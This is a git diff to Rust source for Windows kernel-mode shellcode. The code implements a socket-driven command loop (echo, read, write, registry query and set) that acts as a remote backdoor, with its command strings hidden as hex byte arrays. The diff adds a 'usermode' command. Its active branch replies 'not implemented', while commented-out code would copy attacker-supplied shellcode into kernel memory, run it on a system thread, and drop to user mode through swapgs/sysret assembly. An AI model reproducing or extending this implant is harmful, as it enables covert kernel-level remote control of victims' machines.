@@ -105,6 +105,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
 
     let rtl_get_version: ntdef::functions::RtlGetVersion = ntproc::find!("RtlGetVersion");
     let ps_terminate_system_thread: ntdef::functions::PsTerminateSystemThread = ntproc::find!("PsTerminateSystemThread");
+    // let ps_create_system_thread: ntdef::functions::PsCreateSystemThread = ntproc::find!("PsCreateSystemThread");
     let mut version: ntdef::structs::RTL_OSVERSIONINFOW = core::mem::MaybeUninit::uninit().assume_init();
     version.dwOSVersionInfoSize = core::mem::size_of_val(&version) as _;
     rtl_get_version(&mut version as *mut _ as _);
@@ -157,7 +158,8 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
             let write_cmd = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8];
             let read_cmd = [0x72u8, 0x65u8, 0x61u8, 0x64u8, 0x20u8];
             let queryvalkey_cmd = [0x71u8, 0x75u8, 0x65u8, 0x72u8, 0x79u8, 0x76u8, 0x61u8, 0x6cu8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];
-            let setkey_cmd = [0x73u8, 0x65u8, 0x74u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];          
+            let setkey_cmd = [0x73u8, 0x65u8, 0x74u8, 0x6bu8, 0x65u8, 0x79u8, 0x20u8];
+            let usermode_cmd = [0x75u8, 0x73u8, 0x65u8, 0x72u8, 0x6du8, 0x6fu8, 0x64u8, 0x65u8, 0x20u8];
             if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
                 let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
             } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
@@ -513,6 +515,30 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     let key_create_error_msg = [0x6bu8, 0x65u8, 0x79u8, 0x20u8, 0x63u8, 0x72u8, 0x65u8, 0x61u8, 0x74u8, 0x65u8, 0x20u8, 0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
                     let _ = socket.send(&key_create_error_msg as *const u8, 17);     
                 }
+            } else if ntdef::macros::RtlEqualMemory(buf as _, &usermode_cmd as _, 9) == 1u32 {
+                let not_implemented_msg = [0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x69u8, 0x6du8, 0x70u8, 0x6cu8, 0x65u8, 0x6du8, 0x65u8, 0x6eu8, 0x74u8, 0x65u8, 0x64u8, 0x0au8];
+                let _ = socket.send(&not_implemented_msg as *const u8, 16);
+                /*
+                let mut thread_handle = ex_allocate_pool(ntdef::enums::POOL_TYPE::NonPagedPool, 128);
+                let user_shellcode: ntdef::types::PVOID = ex_allocate_pool(
+                    ntdef::enums::POOL_TYPE::NonPagedPool, buf_len as _
+                );
+                ntdef::macros::RtlCopyMemory(user_shellcode as _, (buf as *mut u8).offset(9) as _, (buf_len-9) as _);
+                let status = ps_create_system_thread(
+                    &mut thread_handle as _, ntdef::enums::THREAD_ALL_ACCESS, ntdef::enums::NULL, 
+                    ntdef::enums::NULL, ntdef::enums::NULL, user_mode_transition as _, user_shellcode as _
+                );
+                if ntdef::macros::NT_SUCCESS(status) {
+                    ((*fs_funcs).zw_close)(thread_handle);
+                    let done_msg = [0x64u8, 0x6fu8, 0x6eu8, 0x65u8, 0x0au8];
+                    let _ = socket.send(&done_msg as *const u8, 5);
+                } else {
+                    let error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x0au8];
+                    let _ = socket.send(&error_msg as *const u8, 6);
+                }
+                ((*fs_funcs).ex_free_pool_with_tag)(thread_handle as _, 1337);
+                // can't free the user_shellcode here because it must be used
+                */
             } else {
                 let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                 let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
@@ -531,6 +557,20 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     ps_terminate_system_thread(ntdef::enums::NTSTATUS::STATUS_SUCCESS as _);
     Ok(())
 }
+
+/*
+#[inline]
+unsafe fn user_mode_transition(user_shellcode: ntdef::types::PVOID) -> () {
+    asm!(
+        "int3",             // for debugging only
+        "xor r11, r11",
+        "mov rcx, {0}",     // unnecessary, because user_shellcode is already in RCX, being the 1st param
+        "swapgs",
+        "sysret",
+        in(reg) user_shellcode
+    );
+}
+*/
 
 #[inline]
 unsafe fn recv_msg(tdi_ctx: *mut nttdi::TdiContext, buf: ntdef::types::PVOID)
